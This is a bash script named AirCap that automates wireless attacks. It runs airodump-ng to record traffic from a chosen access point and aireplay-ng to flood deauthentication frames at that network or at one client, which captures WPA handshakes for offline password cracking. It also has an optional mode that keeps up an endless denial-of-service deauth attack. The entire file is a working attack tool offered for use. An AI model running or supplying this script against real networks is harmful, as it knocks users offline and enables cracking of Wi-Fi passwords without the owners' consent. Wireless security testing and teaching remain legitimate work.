#!/bin/bash

#########################################################
# AirCap Tool For Hunting WPA Handshake and DoS Deauth  #
# Written By Sysc4ll3r                                  #
# https://github.com/Sysc4ll3r/aircap                   #
#########################################################

# Colors
ORANGE="\e[33m"
STOP="\e[0m"
RED="\e[91m"
GREEN="\e[92m"

# Functions

print_usage() {
  printf "${GREEN}\n\n%s\n\n" "[+] Usage: "
  printf "%s\n" "-i|--interface|-iface <wireless interface> , [Needed]"
  printf "%s\n" "-ch|--channel|-chan <channel of accesspoint> , [Needed]"
  printf "%s\n" "-b|--bssid <bssid of accesspoint> , [Needed]"
  printf "%s\n" "-dc|--deauth-count|-count <number of deauth times , Default=0 mean infinity > , [Optional]"
  printf "%s\n" "-c|--client|-client <client macaddress> , [Optional]"
  printf "%s\n" "-f|--file|-file <filename to write the handshake> , [Optional]"
  printf "%s\n" "-dos|--dos|-x , this flag means to make a DOS deauth attack & capture handshake  [Optional]"
  exit 1
}

print_banner() {
  printf "\n\n${GREEN}
 █████╗ ██╗██████╗      ██████╗ █████╗ ██████╗
██╔══██╗██║██╔══██╗    ██╔════╝██╔══██╗██╔══██╗
███████║██║██████╔╝    ██║     ███████║██████╔╝
██╔══██║██║██╔══██╗    ██║     ██╔══██║██╔═══╝
██║  ██║██║██║  ██║    ╚██████╗██║  ██║██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝
                                               "
  printf "\n${ORANGE}[+] AirCap Tool Made By Eslam Mohamed <Sysc4ll3r> To Capture WPA Handshake and PMKID "
  printf "\n${ORANGE}[+] github: https://github.com/Sysc4ll3r"
  sleep 1
}

cleanup() {
  mv "$filename-01.cap" "$filename.cap"
  printf "\n\n${GREEN}[+] Captured Successfully Saved As %s\n" "$filename.cap"
  [[ -n $dos_option ]] && printf "\n\n${ORANGE}[+] To Stop DOS Deauth Attack Press Enter " && read -r stop
  kill $dump_pid $deauth_pid 2>/dev/null
  exit
}

handle_quit() {
  printf "\n\n${RED}[-] Operation aborted by user.\n"
  kill $dump_pid $deauth_pid 2>/dev/null
  exit 1
}

verify_handshake() {
  printf "\n\n${ORANGE}[!] Please Wait Until The Handshake is Captured and Saved Automatically. To Cancel Operation Press CTRL+C"
  while true; do
    verify=$(aircrack-ng "$filename-01.cap" 2>/dev/null | grep -a "handshake" | awk -F " handshake" '{print $1}' | cut -d "(" -f 2)
    if [[ -n $verify && $verify -gt 0 ]]; then
      cleanup
    fi
    if ! kill -0 $deauth_pid 2>/dev/null; then
      printf "\n\n${RED}[-] Error Occured Run it Again\n"
      kill $dump_pid
      exit 1
    fi
    sleep 1
  done
}

start_aircap() {
  printf "\n\n${GREEN}[+] Starting Dumping And Deauth "
  /usr/sbin/airodump-ng "$interface" --bssid "$bssid" --channel "$channel" -w "$filename" --output-format cap > /dev/null 2>&1 &
  dump_pid=$!
  sleep 2
  if [[ -z $client ]]; then
    /usr/sbin/aireplay-ng "$interface" --deauth "$count" -a "$bssid" > /dev/null 2>&1 &
    deauth_pid=$!
  else
    /usr/sbin/aireplay-ng "$interface" --deauth "$count" -a "$bssid" -c "$client" > /dev/null 2>&1 &
    deauth_pid=$!
  fi
  verify_handshake
}

parse_args() {
  while [[ $# -gt 0 ]]; do
    case $1 in
      -i|--interface|-iface)
        interface="$2"
        shift 2
        ;;
      -b|--bssid)
        bssid="$2"
        shift 2
        ;;
      -ch|--channel|-chan)
        channel="$2"
        shift 2
        ;;
      -f|--file|-file)
        filename="$2"
        shift 2
        ;;
      -dc|--deauth-count|-count)
        count="$2"
        shift 2
        ;;
      -c|--client|-client)
        client="$2"
        shift 2
        ;;
      -dos|--dos|-x)
        dos_option=YES
        shift
        ;;
      -*|--*)
        printf "${RED} Unknown option $1"
        print_usage
        ;;
      *)
        shift
        ;;
    esac
  done

  # Set default values for optional parameters
  [[ -z $count ]] && count=0
  [[ -z $filename ]] && filename=aircap_$(date +'%F-%T')
}

validate_args() {
  [[ -z $interface || -z $bssid || -z $channel ]] && print_usage
  [[ $(id -u) -ne 0 ]] && printf "\n\n${RED}[-] Please Run As Root !\n" && exit 1
  [[ -z $(iwconfig 2>/dev/null | grep "$interface") ]] && printf "\n\n${RED}[-] Interface Not Found !\n" && exit 1
  [[ -z $(iwconfig "$interface" 2>/dev/null | grep "Monitor") ]] && printf "\n\n${RED}[-] Please Put The Interface $interface in Monitor Mode Using Command \n\n$ sudo airmon-ng start $interface \n\n  And Try Again  !\n" && exit 1
  [[ -e $filename-01.cap ]] && rm -rf "$filename-01.cap"
}

# Main Execution
trap handle_quit SIGINT

print_banner
parse_args "$@"
validate_args
start_aircap
